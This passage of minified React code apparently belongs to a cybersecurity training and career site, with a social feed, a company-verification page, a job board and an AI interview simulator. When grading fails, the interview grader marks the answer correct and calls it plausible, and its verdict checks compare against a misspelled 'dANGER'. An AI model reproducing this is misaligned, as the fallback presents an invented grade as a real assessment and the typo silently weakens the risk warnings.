font-mono",children:V.author.name.charAt(0)})}),e.jsxs("div",{children:[e.jsx("h3",{className:"font-bold text-[#EAEAEA] group-hover:text-[#00FF88] transition-colors",children:V.author.name}),e.jsxs("div",{className:"flex items-center gap-2 text-xs text-[#00B37A] font-mono mt-0.5",children:[e.jsxs("span",{className:"text-[#00FF88]/80",children:["@",V.author.role.toLowerCase()]}),e.jsx("span",{children:"::"}),e.jsx("span",{children:V.timestamp})]})]})]}),e.jsx("button",{className:"text-[#00B37A] hover:text-[#00FF88]",children:e.jsx(cy,{className:"h-5 w-5"})})]}),e.jsx("p",{className:"text-[#EAEAEA] mb-6 leading-relaxed whitespace-pre-wrap font-light",children:V.content}),e.jsxs("div",{className:"flex items-center justify-between pt-4 border-t border-[#00FF88]/10",children:[e.jsx("div",{className:"flex gap-2",children:V.tags.map(B=>e.jsx("span",{className:"text-[10px] font-mono uppercase tracking-wider text-[#00B37A] bg-[#000000] px-2 py-1 rounded border border-[#00FF88]/20",children:B},B))}),e.jsxs("div",{className:"flex items-center gap-6",children:[e.jsxs("button",{onClick:()=>U(V.id),className:"flex items-center gap-2 text-[#00B37A] hover:text-[#00FF88] transition-colors group/action",children:[e.jsx(ty,{className:"h-4 w-4 group-hover/action:fill-current"}),e.jsx("span",{className:"text-xs font-mono",children:V.likes})]}),e.jsxs("button",{onClick:()=>H(V.id),className:`flex items-center gap-2 transition-colors group/action ${w===V.id?"text-[#00FF88]":"text-[#00B37A] hover:text-[#EAEAEA]"}`,children:[e.jsx(Sm,{className:"h-4 w-4"}),e.jsx("span",{className:"text-xs font-mono",children:V.comments})]}),e.jsxs("button",{onClick:()=>z(V.id),className:"flex items-center gap-2 text-[#00B37A] hover:text-[#EAEAEA] transition-colors",children:[e.jsx(hy,{className:"h-4 w-4"}),e.jsx("span",{className:"text-xs font-mono",children:V.shares||0})]})]})]}),w===V.id&&e.jsxs("div",{className:"mt-4 pt-4 border-t border-[#00FF88]/10 space-y-4 animate-in fade-in slide-in-from-top-2",children:[e.jsxs("form",{onSubmit:B=>G(B,V.id),className:"flex gap-3",children:[e.jsx("div",{className:"w-8 h-8 rounded bg-[#0A0F0A] flex items-center justify-center flex-shrink-0 border border-[#00FF88]/30",children:e.jsx(zt,{className:"h-4 w-4 text-[#00FF88]"})}),e.jsxs("div",{className:"flex-1 flex gap-2",children:[e.jsx("input",{type:"text",value:N,onChange:B=>k(B.target.value),placeholder:"Reply to this signal...",className:"flex-1 bg-[#000000]/50 border border-[#00FF88]/20 rounded-lg px-4 py-2 text-sm text-[#EAEAEA] placeholder:text-[#00B37A]/50 focus:border-[#00FF88] focus:ring-1 focus:ring-[#00FF88] transition-all"}),e.jsx("button",{type:"submit",disabled:!N.trim(),className:"px-4 py-2 bg-[#00FF88]/10 hover:bg-[#00FF88]/20 text-[#00FF88] rounded-lg text-xs font-bold uppercase tracking-wider border border-[#00FF88]/20 transition-all disabled:opacity-50",children:"Reply"})]})]}),e.jsxs("div",{className:"space-y-3 pl-11",children:[F[V.id]?.map(B=>e.jsxs("div",{className:"bg-[#000000]/30 rounded-lg p-3 border border-[#00FF88]/5",children:[e.jsxs("div",{className:"flex items-center gap-2 mb-1",children:[e.jsx("span",{className:"text-xs font-bold text-[#00FF88]",children:B.author.name}),e.jsx("span",{className:"text-[10px] text-[#00B37A] font-mono",children:B.timestamp})]}),e.jsx("p",{className:"text-sm text-[#EAEAEA] font-light",children:B.content})]},B.id)),(!F[V.id]||F[V.id].length===0)&&e.jsx("p",{className:"text-xs text-[#00B37A] italic",children:"No replies yet. Be the first to intercept."})]})]})]},V.id))})]})]})]})]})},Vc=({active:a,onClick:n,label:s,icon:i})=>e.jsxs("button",{onClick:n,className:`w-full flex items-center gap-3 px-4 py-3 rounded-lg transition-all duration-200 border ${a?"bg-[#00FF88]/10 border-[#00FF88]/50 text-[#00FF88]":"bg-transparent border-transparent text-[#00B37A] hover:bg-[#0A0F0A] hover:text-[#EAEAEA]"}`,children:[i,e.jsx("span",{className:"font-medium text-sm",children:s}),a&&e.jsx("div",{className:"ml-auto w-1.5 h-1.5 rounded-full bg-[#00FF88] shadow-[0_0_8px_rgba(0,255,136,0.5)]"})]}),_2="http://localhost:4000/api";class S2{async verifyCompany(n){try{console.log("Verifying company via API:",n);const s=await fetch(`${_2}/student/verify-company`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({query:n})});if(!s.ok)throw console.error("API Verification failed"),new Error("Verification failed");const i=await s.json();return{name:i.scraped_data?.name||i.scraped_data?.title||n,domain:n,trust_score:100-i.risk_score,status:i.verdict==="SAFE"?"verified":i.verdict==="dANGER"?"warning":"unverified",founded_year:i.details?.domain_age_days?`${Math.floor(i.details.domain_age_days/365)} years ago`:"Unknown",location:i.details?.domain_registrar||"Unknown",description:i.explanation||i.scraped_data?.description||"No description available.",certifications:i.details?.green_flags||[],verification_source:"CyberCoach AI Analyzer",last_verified_at:new Date().toISOString(),verdict:i.verdict,explanation:i.explanation,recommendation:i.recommendation,scam_hits:i.details?.scam_hits,sentiment:i.details?.sentiment,red_flags:i.details?.red_flags,green_flags:i.details?.green_flags}}catch(s){return console.error("Verify company error:",s),null}}}const A2=new S2,E2=()=>{const[a,n]=v.useState(""),[s,i]=v.useState(null),[o,c]=v.useState(!1),d=async x=>{if(x.preventDefault(),!!a.trim()){c(!0),i(null);try{const p=await A2.verifyCompany(a);p&&i(p)}catch(p){console.error("Search failed:",p)}finally{c(!1)}}},m=x=>x>=90?"text-emerald-400":x>=70?"text-amber-400":"text-red-400",f=x=>{switch(x){case"verified":return e.jsxs("span",{className:"flex items-center gap-1.5 px-3 py-1 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 text-sm font-medium",children:[e.jsx(Pe,{className:"h-4 w-4"})," Verified Entity"]});case"warning":return e.jsxs("span",{className:"flex items-center gap-1.5 px-3 py-1 rounded-full bg-red-500/10 text-red-400 border border-red-500/20 text-sm font-medium",children:[e.jsx(or,{className:"h-4 w-4"})," High Risk"]});default:return e.jsxs("span",{className:"flex items-center gap-1.5 px-3 py-1 rounded-full bg-slate-500/10 text-slate-400 border border-slate-500/20 text-sm font-medium",children:[e.jsx(or,{className:"h-4 w-4"})," Unverified"]})}};return e.jsx("div",{className:"p-6 min-h-screen bg-black animate-fade-in text-[#EAEAEA]",children:e.jsxs("div",{className:"max-w-3xl mx-auto space-y-8",children:[e.jsx("div",{className:"mb-6",children:e.jsxs("button",{onClick:()=>window.location.href="/?tab=landing",className:"flex items-center text-[#00B37A] hover:text-white transition-colors font-mono uppercase tracking-wider text-sm",children:[e.jsx(ys,{className:"h-4 w-4 mr-2"}),"Back to Home"]})}),e.jsxs("div",{className:"text-center space-y-4",children:[e.jsx("div",{className:"inline-flex items-center justify-center p-4 rounded-2xl bg-[#00FF88]/5 border border-[#00FF88]/20 mb-4 shadow-[0_0_30px_rgba(0,255,136,0.1)]",children:e.jsx(ze,{className:"h-12 w-12 text-[#00FF88]"})}),e.jsxs("h1",{className:"text-4xl font-black text-white uppercase tracking-tighter",children:["Company ",e.jsx("span",{className:"text-[#00FF88]",children:"Verification"})]}),e.jsx("p",{className:"text-[#00B37A] max-w-lg mx-auto font-mono text-sm",children:"AUTHENTICATE CORPORATE ENTITIES AGAINST GLOBAL REGISTRIES"})]}),e.jsxs("div",{className:"bg-[#0A0F0A] rounded-2xl border border-[#00FF88]/10 p-8 shadow-xl relative overflow-hidden",children:[e.jsx("div",{className:"absolute inset-0 bg-gradient-to-b from-[#00FF88]/5 to-transparent pointer-events-none"}),e.jsxs("form",{onSubmit:d,className:"relative z-10",children:[e.jsx(Dr,{className:"absolute left-4 top-1/2 -translate-y-1/2 h-5 w-5 text-[#00B37A]"}),e.jsx("input",{type:"text",value:a,onChange:x=>n(x.target.value),placeholder:"ENTER DOMAIN OR ENTITY NAME...",className:"w-full bg-black border border-[#00FF88]/20 rounded-xl pl-12 pr-32 py-4 text-white placeholder-[#00B37A]/50 focus:outline-none focus:border-[#00FF88] focus:shadow-[0_0_20px_rgba(0,255,136,0.1)] font-mono transition-all"}),e.jsx("button",{type:"submit",disabled:o||!a.trim(),className:"absolute right-2 top-2 bottom-2 px-6 bg-[#00FF88] text-black rounded-lg font-bold hover:bg-[#00CC66] transition-all disabled:opacity-50 disabled:cursor-not-allowed shadow-[0_0_15px_rgba(0,255,136,0.3)] uppercase tracking-wide",children:o?"SCANNING...":"VERIFY"})]})]}),s?e.jsxs("div",{className:"bg-[#0A0F0A] rounded-2xl border border-[#00FF88]/10 overflow-hidden relative group",children:[e.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-[#00FF88]/0 via-[#00FF88]/0 to-[#00FF88]/0 group-hover:via-[#00FF88]/5 transition-all duration-500"}),e.jsxs("div",{className:"p-8 border-b border-[#00FF88]/10 relative z-10",children:[e.jsxs("div",{className:"flex flex-col md:flex-row justify-between items-start gap-6",children:[e.jsxs("div",{children:[e.jsxs("div",{className:"flex items-center gap-4 mb-2",children:[e.jsx("h2",{className:"text-3xl font-black text-white uppercase tracking-tight",children:s.name}),f(s.status)]}),e.jsxs("div",{className:"flex items-center gap-2 text-[#00B37A] font-mono text-sm",children:[e.jsx(In,{className:"h-4 w-4"}),e.jsxs("a",{href:`https://${s.domain}`,target:"_blank",rel:"noreferrer",className:"hover:text-[#00FF88] transition-colors flex items-center gap-1 underline decoration-[#00B37A]/30 underline-offset-4",children:[s.domain,e.jsx(Ao,{className:"h-3 w-3"})]})]})]}),e.jsxs("div",{className:"text-center bg-black p-4 rounded-xl border border-[#00FF88]/20 min-w-[120px] shadow-[0_0_15px_rgba(0,255,136,0.1)]",children:[e.jsx("div",{className:"text-[10px] text-[#00B37A] mb-1 uppercase tracking-wider",children:"Trust Score"}),e.jsx("div",{className:`text-4xl font-black font-mono ${m(s.trust_score)}`,children:s.trust_score})]})]}),s.verdict&&e.jsx("div",{className:`mt-6 p-4 rounded-xl border ${s.verdict==="SAFE"?"bg-emerald-500/10 border-emerald-500/20":s.verdict==="dANGER"?"bg-red-500/10 border-red-500/20":"bg-amber-500/10 border-amber-500/20"}`,children:e.jsxs("div",{className:"flex items-start gap-3",children:[s.verdict==="SAFE"?e.jsx(Pe,{className:"h-6 w-6 text-emerald-400"}):s.verdict==="dANGER"?e.jsx(or,{className:"h-6 w-6 text-red-400"}):e.jsx(or,{className:"h-6 w-6 text-amber-400"}),e.jsxs("div",{children:[e.jsxs("h3",{className:`font-bold uppercase tracking-wide mb-1 ${s.verdict==="SAFE"?"text-emerald-400":s.verdict==="dANGER"?"text-red-400":"text-amber-400"}`,children:["Verdict: ",s.verdict]}),e.jsx("p",{className:"text-sm text-[#EAEAEA]/90 font-mono",children:s.explanation}),s.recommendation&&e.jsxs("div",{className:"mt-2 text-xs font-bold uppercase tracking-widest opacity-80",children:["Recommendation: ",s.recommendation]})]})]})})]}),e.jsxs("div",{className:"p-8 grid grid-cols-1 md:grid-cols-2 gap-8 relative z-10",children:[e.jsxs("div",{className:"space-y-6",children:[e.jsxs("div",{children:[e.jsxs("h3",{className:"text-xs font-bold text-[#00B37A] uppercase tracking-widest mb-3 flex items-center gap-2",children:[e.jsx(Gv,{className:"h-4 w-4"}),"Entity Details"]}),e.jsxs("div",{className:"space-y-3 font-mono text-sm",children:[e.jsxs("div",{className:"flex items-center gap-3 text-[#EAEAEA]",children:[e.jsx("span",{className:"text-[#00B37A]",children:"ESTABLISHED:"}),e.jsx("span",{children:s.founded_year})]}),e.jsxs("div",{className:"flex items-center gap-3 text-[#EAEAEA]",children:[e.jsx("span",{className:"text-[#00B37A]",children:"HQ LOCATION:"}),e.jsx("span",{children:s.location})]})]})]}),e.jsxs("div",{children:[e.jsx("h3",{className:"text-xs font-bold text-[#00B37A] uppercase tracking-widest mb-3",children:"Analysis Profile"}),e.jsx("p",{className:"text-[#EAEAEA]/80 leading-relaxed text-sm mb-4",children:s.description}),e.jsxs("div",{className:"grid grid-cols-2 gap-4",children:[e.jsxs("div",{className:"bg-red-500/5 border border-red-500/10 p-3 rounded-lg",children:[e.jsx("div",{className:"text-[10px] text-red-400 uppercase tracking-wider mb-2",children:"Red Flags"}),s.red_flags&&s.red_flags.length>0?e.jsx("ul",{className:"list-disc list-inside text-xs text-red-300 font-mono",children:s.red_flags.map((x,p)=>e.jsx("li",{children:x},p))}):e.jsx("span",{className:"text-xs text-zinc-500 italic",children:"None detected"})]}),e.jsxs("div",{className:"bg-emerald-500/5 border border-emerald-500/10 p-3 rounded-lg",children:[e.jsx("div",{className:"text-[10px] text-emerald-400 uppercase tracking-wider mb-2",children:"Green Flags"}),s.green_flags&&s.green_flags.length>0?e.jsx("ul",{className:"list-disc list-inside text-xs text-emerald-300 font-mono",children:s.green_flags.map((x,p)=>e.jsx("li",{children:x},p))}):e.jsx("span",{className:"text-xs text-zinc-500 italic",children:"None detected"})]})]})]})]}),e.jsxs("div",{children:[e.jsxs("h3",{className:"text-xs font-bold text-[#00B37A] uppercase tracking-widest mb-3 flex items-center gap-2",children:[e.jsx(tt,{className:"h-4 w-4"}),"Certifications & Signals"]}),s.certifications&&s.certifications.length>0?e.jsx("div",{className:"flex flex-wrap gap-2 mb-6",children:s.certifications.map((x,p)=>e.jsxs("div",{className:"flex items-center gap-2 bg-[#00FF88]/5 border border-[#00FF88]/20 px-3 py-2 rounded-lg text-[#EAEAEA]",children:[e.jsx(Pe,{className:"h-3 w-3 text-[#00FF88]"}),e.jsx("span",{className:"text-xs font-mono font-bold",children:x})]},p))}):e.jsxs("div",{className:"flex items-center gap-2 text-zinc-500 italic bg-zinc-500/5 p-3 rounded-lg border border-zinc-500/10 text-sm mb-6",children:[e.jsx(or,{className:"h-4 w-4"}),"No specific certification signals"]}),e.jsxs("div",{className:"p-4 bg-[#00FF88]/5 border border-[#00FF88]/20 rounded-xl space-y-4",children:[e.jsxs("div",{className:"flex items-start gap-3",children:[e.jsx(Xv,{className:"h-5 w-5 text-[#00FF88] mt-0.5"}),e.jsxs("div",{children:[e.jsx("h4",{className:"font-bold text-[#00FF88] text-sm mb-1 uppercase tracking-wide",children:"Verified Source"}),e.jsx("p",{className:"text-xs text-[#00B37A] font-mono mb-2",children:s.verification_source}),e.jsxs("div",{className:"flex items-center gap-2 text-[10px] text-[#00B37A]/70 uppercase tracking-wider border-t border-[#00FF88]/10 pt-2",children:[e.jsx(Pt,{className:"h-3 w-3"}),"LAST VERIFIED: ",new Date(s.last_verified_at).toLocaleDateString()]})]})]}),s.sentiment&&e.jsxs("div",{className:"border-t border-[#00FF88]/10 pt-3",children:[e.jsxs("div",{className:"flex justify-between items-center mb-1",children:[e.jsx("span",{className:"text-[10px] text-[#00B37A] uppercase tracking-wider",children:"Online Reputation"}),e.jsx("span",{className:`text-xs font-bold uppercase ${s.sentiment==="positive"?"text-emerald-400":s.sentiment==="negative"?"text-red-400":"text-amber-400"}`,children:s.sentiment})]}),e.jsxs("div",{className:"text-[10px] text-zinc-400 font-mono",children:["Found ",s.scam_hits," potential scam reports/reviews."]})]})]})]})]})]}):e.jsxs("div",{className:"text-center py-12 border border-dashed border-[#00FF88]/20 rounded-xl bg-[#0A0F0A]/50",children:[e.jsx("div",{className:"text-[#00FF88]/20 mb-4",children:e.jsx(Dr,{className:"h-12 w-12 mx-auto"})}),e.jsx("h3",{className:"text-lg font-bold text-white mb-1 uppercase tracking-widest",children:"Entity Not Found"}),e.jsxs("p",{className:"text-[#00B37A] font-mono text-sm",children:['No verified record found for "',a,'" in the global registry.']})]})]})})},C2={async getJobListings(){try{const a=await fetch("http://localhost:4000/api/student/jobs");if(!a.ok)throw new Error("Failed to fetch jobs");return await a.json()}catch(a){return console.error("Error fetching job listings:",a),[]}},async applyForJob(){return await new Promise(a=>setTimeout(a,1500)),!0}},T2=()=>{const[a,n]=v.useState([]),[s,i]=v.useState(!0),[o,c]=v.useState("all"),[d,m]=v.useState("");v.useEffect(()=>{f()},[]);const f=async()=>{try{const p=await C2.getJobListings();n(p)}catch(p){console.error("Failed to load jobs:",p)}finally{i(!1)}},x=a.filter(p=>{const b=o==="all"||p.type===o,w=p.title.toLowerCase().includes(d.toLowerCase())||p.company.toLowerCase().includes(d.toLowerCase());return b&&w});return e.jsxs("div",{className:"p-6 space-y-8 min-h-screen animate-fade-in text-[#EAEAEA]",children:[e.jsxs("div",{className:"flex items-center justify-between border-b border-[#00FF88]/10 pb-6",children:[e.jsxs("div",{children:[e.jsxs("h1",{className:"text-3xl font-black tracking-tighter text-white uppercase",children:["Mission ",e.jsx("span",{className:"text-[#00FF88]",children:"Board"})]}),e.jsx("p",{className:"text-[#00B37A] font-mono text-sm mt-1",children:"AVAILABLE CONTRACTS & BOUNTIES"})]}),e.jsx("div",{className:"h-10 w-10 rounded bg-[#00FF88]/10 border border-[#00FF88]/20 flex items-center justify-center",children:e.jsx(k0,{className:"h-5 w-5 text-[#00FF88]"})})]}),e.jsxs("div",{className:"flex flex-col md:flex-row gap-4",children:[e.jsxs("div",{className:"relative flex-1",children:[e.jsx(Dr,{className:"absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-[#00B37A]"}),e.jsx("input",{type:"text",placeholder:"Search missions...",value:d,onChange:p=>m(p.target.value),className:"w-full bg-[#0A0F0A] border border-[#00FF88]/20 rounded-lg pl-10 pr-4 py-2 text-[#EAEAEA] focus:outline-none focus:border-[#00FF88]/50 placeholder-[#00B37A]/50"})]}),e.jsx("div",{className:"flex gap-2",children:["all","Full-time","Contract","Bounty"].map(p=>e.jsx("button",{onClick:()=>c(p),className:`px-4 py-2 rounded-lg text-sm font-bold uppercase tracking-wider border transition-all ${o===p?"bg-[#00FF88]/10 border-[#00FF88] text-[#00FF88]":"bg-[#0A0F0A] border-[#00FF88]/10 text-[#00B37A] hover:border-[#00FF88]/30"}`,children:p},p))})]}),e.jsx("div",{className:"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6",children:s?Array.from({length:6}).map((p,b)=>e.jsx("div",{className:"h-64 bg-[#0A0F0A] rounded-xl border border-[#00FF88]/10 animate-pulse"},b)):x.length>0?x.map(p=>e.jsxs("div",{className:"group relative bg-[#0A0F0A] border border-[#00FF88]/20 rounded-xl p-6 hover:border-[#00FF88]/50 transition-all duration-300 hover:shadow-[0_0_20px_rgba(0,255,136,0.1)] flex flex-col",children:[e.jsx("div",{className:"absolute top-4 right-4",children:e.jsx("span",{className:`px-2 py-1 rounded text-[10px] font-bold uppercase tracking-wider border ${p.type==="Bounty"?"bg-red-500/10 text-red-400 border-red-500/20":"bg-[#00FF88]/10 text-[#00FF88] border-[#00FF88]/20"}`,children:p.type})}),e.jsxs("div",{className:"mb-4",children:[e.jsx("h3",{className:"text-xl font-bold text-white group-hover:text-[#00FF88] transition-colors line-clamp-1",children:p.title}),e.jsxs("div",{className:"flex items-center gap-2 text-[#00B37A] text-sm font-mono mt-1",children:[e.jsx(ze,{className:"h-3 w-3"}),p.company,e.jsx("span",{className:"text-[#00B37A]/50 ml-auto",children:p.source})]})]}),e.jsxs("div",{className:"space-y-3 mb-6 flex-1",children:[e.jsxs("div",{className:"flex items-center gap-2 text-sm text-[#EAEAEA]",children:[e.jsx(_0,{className:"h-4 w-4 text-[#00B37A]"}),p.location]}),e.jsxs("div",{className:"flex items-center gap-2 text-sm text-[#EAEAEA]",children:[e.jsx(Zv,{className:"h-4 w-4 text-[#00B37A]"}),p.salary_range]}),e.jsx("div",{className:"flex flex-wrap gap-2 mt-4",children:p.requirements.slice(0,3).map((b,w)=>e.jsx("span",{className:"px-2 py-1 rounded bg-[#00FF88]/5 border border-[#00FF88]/10 text-[10px] text-[#00B37A] font-mono",children:b},w))})]}),e.jsxs("a",{href:p.link,target:"_blank",rel:"noopener noreferrer",className:"w-full bg-[#00FF88] hover:bg-[#00CC66] text-black font-bold py-3 px-4 rounded-lg flex items-center justify-center gap-2 transition-all",children:[e.jsx(Ao,{className:"h-4 w-4"}),"ACCEPT MISSION"]})]},p.id)):e.jsx("div",{className:"col-span-full text-center py-12 text-[#00B37A]",children:e.jsx("p",{children:"No active missions found matching your criteria."})})})]})},_o={getNextQuestion:async(a,n,s)=>{try{console.log(`[InterviewService] Fetching ${a} question for position: ${n||"General"}. Resume context: ${s?"Provided":"None"}`);const{data:i,error:o}=await Z.from("interview_questions").select("*").eq("category",a);if(o||!i||i.length===0)return console.warn("Error fetching questions or no questions found. Using fallback.",o),Vm(a);const c=i[Math.floor(Math.random()*i.length)];if(c.question_text.includes("{company}")){const{data:d,error:m}=await Z.from("company_registry").select("name").eq("status","verified");if(!m&&d&&d.length>0){const f=d[Math.floor(Math.random()*d.length)];c.question_text=c.question_text.replace(/{company}/g,f.name)}else c.question_text=c.question_text.replace(/{company}/g,"a generic tech company")}return c}catch(i){return console.error("Interview service error:",i),Vm(a)}},validateAnswer:async(a,n,s,i)=>{const o=`
      You are an expert interviewer.
      ${s?`The candidate is applying for the position: "${s}".`:""}
      ${i?`Candidate's Resume/Background: "${i}".`:""}
      
      Question: "${a.question_text}"
      Ideal Answer / Key Points: "${a.ideal_answer}"
      User's Answer: "${n}"
      
      Evaluate the user's answer.
      1. Determine if it is "Correct" (covers key points), "Partially Correct", or "Incorrect".
      2. Provide brief, constructive feedback (max 2 sentences).
      3. If incorrect, explain the right concept simply.
      ${s?"Tailor your feedback based on the target position requirements.":""}
      
      Output JSON format:
      {
        "isCorrect": boolean,
        "feedback": "string"
      }
    `;try{const d=(await zs.chat(o,"You are a strict but helpful interviewer. Output JSON only.")).replace(/```json/g,"").replace(/```/g,"").trim();return JSON.parse(d)}catch(c){return console.error("Error validating answer:",c),{isCorrect:!0,feedback:"I couldn't verify that with the central database, but it sounds plausible. Let's move on."}}}},Vm=a=>{const n={technical:[{id:"f1",category:"technical",difficulty:"medium",question_text:'Explain the concept of "Least Privilege" and why it is important.',ideal_answer:"Users should only have the minimum access necessary to perform their job functions to limit attack surface."},{id:"f2",category:"technical",difficulty:"easy",question_text:"What is the difference between HTTP and HTTPS?",ideal_answer:"HTTPS uses TLS/SSL encryption to secure the communication channel."}],hr:[{id:"f3",category:"hr",difficulty:"easy",question_text:"Tell me about a time you had to handle a difficult situation at work.",ideal_answer:"STAR method: Situation, Task, Action, Result."},{id:"f4",category:"hr",difficulty:"medium",question_text:"Why do you want to work in cybersecurity?",ideal_answer:"Passion for problem solving, protecting data, and evolving landscape."}],aptitude:[{id:"f5",category:"aptitude",difficulty:"medium",question_text:"If you have a 3-gallon jug and a 5-gallon jug, how do you measure out exactly 4 gallons?",ideal_answer:"Fill 5, pour to 3 (leaves 2). Empty 3. Pour 2 to 3. Fill 5. Pour to 3 (takes 1). Leaves 4."},{id:"f6",category:"aptitude",difficulty:"easy",question_text:"What comes next: 2, 4, 8, 16, ...?",ideal_answer:"32 (Powers of 2)."}]},s=n[a]||n.technical;return s[Math.floor(Math.random()*s.length)]},P2=()=>{const[a,n]=v.useState([{id:"1",sender:"bot",text:"Greetings, Operator. I am CORTEX, your tactical interview simulation unit. Select a protocol to begin your assessment.",timestamp:new Date}]),[s,i]=v.useState(""),[o,c]=v.useState(!1),[d,m]=v.useState(null),[f,x]=v.useState(null),[p,b]=v.useState(!1),[w,j]=v.useState(""),[N,k]=v.useState(null),[F,T]=v.useState(null),[R,S]=v.useState(!1),[U,z]=v.useState(!0),H=v.useRef(null),G=()=>{H.current?.scrollIntoView({behavior:"smooth"})};v.useEffect(()=>{G()},[a,o]),v.useEffect(()=>{if(a.length>0&&a[a.length-1].type==="feedback"&&d&&!p&&!o){const fe=setTimeout(()=>{ae(d)},5e3);return()=>clearTimeout(fe)}},[a,d,p,o]);const O=async ne=>{const fe=ne.target.files?.[0];if(fe){k(fe),S(!0);try{let ie="";fe.type==="application/pdf"?ie=await V(fe):ie=await fe.text();const ee=await zs.parseResume(ie);T(JSON.stringify(ee))}catch(ie){console.error("Resume parsing failed",ie)}finally{S(!1)}}},V=async ne=>{try{const fe=await pr(()=>import("./pdf-DUPavs6M.js"),[]);fe.GlobalWorkerOptions.workerSrc="/pdf.worker.min.js";const ie=await ne.arrayBuffer(),ee=await fe.getDocument({data:ie}).promise;let M="";for(let W=1;W<=ee.numPages;W++){const I=(await(await ee.getPage(W)).getTextContent()).items.map(P=>P.str).join(" ");M+=I+`
`}return M}catch(fe){return console.error("PDF extraction error",fe),""}},B=async ne=>{m(ne),z(!1),n(fe=>[...fe,{id:Date.now().toString(),sender:"bot",text:`Initializing ${ne.toUpperCase()} PROTOCOL... Target Position: ${w||"General Cybersecurity"}. Resume analysis complete.`,timestamp:new Date}]),await ae(ne)},ae=async ne=>{c(!0);try{const fe=await _o.getNextQuestion(ne,w,F||void 0);fe?(x(fe),b(!0),n(ie=>[...ie,{id:Date.now().toString(),sender:"bot",text:fe.question_text,timestamp:new Date}])):n(ie=>[...ie,{id:Date.now().toString(),sender:"bot",text:"Error accessing database. Retrying connection...",timestamp:new Date}])}catch(fe){console.error("Failed to load question",fe)}finally{c(!1)}},xe=async()=>{if(!s.trim())return;const ne={id:Date.now().toString(),sender:"user",text:s,timestamp:new Date};if(n(fe=>[...fe,ne]),i(""),d&&p&&f){c(!0),b(!1);try{const fe=await _o.validateAnswer(f,ne.text,w,F||void 0),ie={id:(Date.now()+1).toString(),sender:"bot",text:fe.feedback,timestamp:new Date,type:"feedback",feedback:fe};n(ee=>[...ee,ie])}catch(fe){console.error("Validation error",fe)}finally{c(!1)}}},ye=()=>{m(null),x(null),b(!1),z(!0),k(null),T(null),n([{id:Date.now().toString(),sender:"bot",text:"Simulation reset. Update your configuration or select a protocol to begin.",timestamp:new Date}])};return e.jsxs("div",{className:"flex flex-col h-[calc(100vh-100px)] max-w-4xl mx-auto bg-[#0A0F0A] border border-[#00FF88]/20 rounded-xl overflow-hidden shadow-2xl font-mono",children:[e.jsxs("div",{className:"bg-[#0A0F0A] border-b border-[#00FF88]/10 p-4 flex items-center justify-between",children:[e.jsxs("div",{className:"flex items-center gap-3",children:[e.jsxs("div",{className:"h-10 w-10 rounded-full bg-[#00FF88]/10 border border-[#00FF88]/20 flex items-center justify-center relative",children:[e.jsx(nd,{className:"h-6 w-6 text-[#00FF88]"}),e.jsx("div",{className:"absolute inset-0 bg-[#00FF88]/20 rounded-full animate-pulse"})]}),e.jsxs("div",{children:[e.jsx("h2",{className:"text-lg font-bold text-white tracking-wider",children:"CORTEX UNIT"}),e.jsxs("p",{className:"text-xs text-[#00B37A]",children:["STATUS: ",d?`${d.toUpperCase()} MODE ACTIVE`:"AWAITING INPUT"]})]})]}),e.jsxs("div",{className:"flex gap-2",children:[e.jsx("button",{className:"p-2 hover:bg-[#00FF88]/10 rounded-lg transition-colors text-[#00B37A]",children:e.jsx(C0,{className:"h-5 w-5"})}),e.jsx("button",{onClick:ye,className:"p-2 hover:bg-[#00FF88]/10 rounded-lg transition-colors text-[#00B37A]",title:"Reset Simulation",children:e.jsx(Ba,{className:"h-5 w-5"})})]})]}),e.jsxs("div",{className:"flex-1 overflow-y-auto p-6 space-y-6 bg-[url('/grid-pattern.png')] bg-repeat opacity-90 relative",children:[!d&&U&&e.jsxs("div",{className:"space-y-6 animate-in fade-in slide-in-from-bottom-4 mb-8",children:[e.jsxs("div",{className:"bg-[#0A0F0A] border border-[#00FF88]/20 p-6 rounded-xl space-y-6",children:[e.jsxs("h3",{className:"text-[#00FF88] font-bold flex items-center gap-2 tracking-widest text-sm text-center justify-center",children:[e.jsx(ze,{className:"h-4 w-4"})," INTERVIEW PARAMETERS"]}),e.jsxs("div",{className:"space-y-4",children:[e.jsxs("div",{children:[e.jsx("label",{className:"text-[10px] text-[#00B37A] uppercase font-bold mb-2 block",children:"Target Position"}),e.jsx("input",{type:"text",value:w,onChange:ne=>j(ne.target.value),placeholder:"e.g. SOC Analyst, Penetration Tester...",className:"w-full bg-black border border-[#00FF88]/20 rounded-lg px-4 py-3 text-white focus:border-[#00FF88]/50 outline-none placeholder-[#00B37A]/30 transition-all"})]}),e.jsxs("div",{children:[e.jsx("label",{className:"text-[10px] text-[#00B37A] uppercase font-bold mb-2 block",children:"Resume Upload (PDF/TXT)"}),N?e.jsxs("div",{className:"flex items-center justify-between p-4 bg-[#00FF88]/5 border border-[#00FF88]/30 rounded-lg animate-in fade-in zoom-in-95",children:[e.jsxs("div",{className:"flex items-center gap-3",children:[e.jsx("div",{className:"h-10 w-10 rounded bg-[#00FF88]/10 flex items-center justify-center",children:e.jsx(Mt,{className:"h-5 w-5 text-[#00FF88]"})}),e.jsxs("div",{children:[e.jsx("p",{className:"text-xs font-bold text-white truncate max-w-[200px]",children:N.name}),e.jsx("p",{className:"text-[10px] text-[#00B37A]",children:R?"ANALYZING NEURAL PATTERNS...":"DATA EXTRACTED & VERIFIED"})]})]}),e.jsxs("div",{className:"flex items-center gap-2",children:[!R&&e.jsx(Pe,{className:"h-5 w-5 text-[#00FF88]"}),e.jsx("button",{onClick:()=>{k(null),T(null)},className:"p-1 hover:bg-[#FF0055]/10 rounded text-[#FF0055] transition-colors",children:e.jsx(Co,{className:"h-4 w-4"})})]})]}):e.jsxs("div",{className:"relative group",children:[e.jsx("input",{type:"file",onChange:O,accept:".pdf,.txt",className:"absolute inset-0 w-full h-full opacity-0 cursor-pointer z-10"}),e.jsxs("div",{className:"w-full border-2 border-dashed border-[#00FF88]/20 group-hover:border-[#00FF88]/50 rounded-lg p-8 flex flex-col items-center justify-center transition-all bg-black/50",children:[e.jsx(Ed,{className:"h-8 w-8 text-[#00B37A] mb-3 group-hover:scale-110 transition-transform"}),e.jsx("p",{className:"text-xs text-[#00B37A] font-mono",children:"DRAG & DROP OR CLICK TO UPLOAD"}),e.jsx("p",{className:"text-[10px] text-[#00B37A]/50 mt-2 italic",children:"SECURE 